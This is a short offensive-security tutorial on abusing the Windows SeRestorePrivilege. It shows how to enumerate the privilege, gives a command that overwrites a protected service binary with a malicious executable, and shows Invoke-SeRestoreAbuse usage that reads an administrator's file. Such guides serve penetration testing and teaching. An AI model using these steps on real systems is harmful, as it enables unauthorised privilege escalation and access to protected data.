**SeRestorePrivilege** allows a user to bypass NTFS discretionary access control when writing to files and registry objects. In normal Windows enforcement, write operations are restricted by ACLs, but when this privilege is enabled, the security subsystem permits modifications even on protected system paths.

This behavior becomes relevant in post-exploitation scenarios because write capability to privileged locations can be leveraged to influence system execution paths, configuration files, or service binaries. The risk increases significantly when the attacker can control the content written to those locations.

---

## Detection 

In Active Directory environments, SeRestorePrivilege is commonly assigned to backup operators or delegated administrative roles. Although not equivalent to full administrative rights, it effectively grants indirect system-level modification capability.

Enumeration typically confirms the privilege as:

```bash
whoami /priv
```

If enabled, it appears as:

```text
SeRestorePrivilege        Enabled
```

---

## Exploitation using file overwrite operations

The core abuse mechanism relies on writing to protected locations that normally require SYSTEM or administrator-level access. When `SeRestorePrivilege` is enabled, Windows allows these operations even for low-privileged users.

A typical abuse scenario involves overwriting binaries or configuration files used by privileged services.

### Example: overwriting a service binary path

If a service executes a binary from a known path, an attacker can replace it:

```bash
copy malicious.exe "C:\Program Files\TargetService\service.exe"
```

Even if ACLs deny access, `SeRestorePrivilege` allows the write operation.

Once the service restarts or is triggered, the malicious binary executes with service-level privileges.

---

## Exploitation using Invoke-SeRestoreAbuse

[Invoke-SeRestoreAbuse](https://github.com/0x4D-5A/Invoke-SeRestoreAbuse) automates abuse of `SeRestorePrivilege` by leveraging Windows APIs that allow privileged file write operations. The module executes commands in contexts where standard write restrictions are ignored, enabling manipulation of sensitive files.

The typical usage involves importing the module and executing a command payload through controlled file write operations.

```powershell
Import-Module .\Invoke-SeRestoreAbuse.ps1
```

Once loaded, the module can execute arbitrary commands via file manipulation primitives.

```powershell
Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "cat c:\users\administrator\desktop\proof.txt > c:\foo.txt"'
```

This works because SeRestorePrivilege allows the underlying write operation to `C:\foo.txt` even when ACLs would normally block access, enabling extraction of sensitive data from restricted directories.

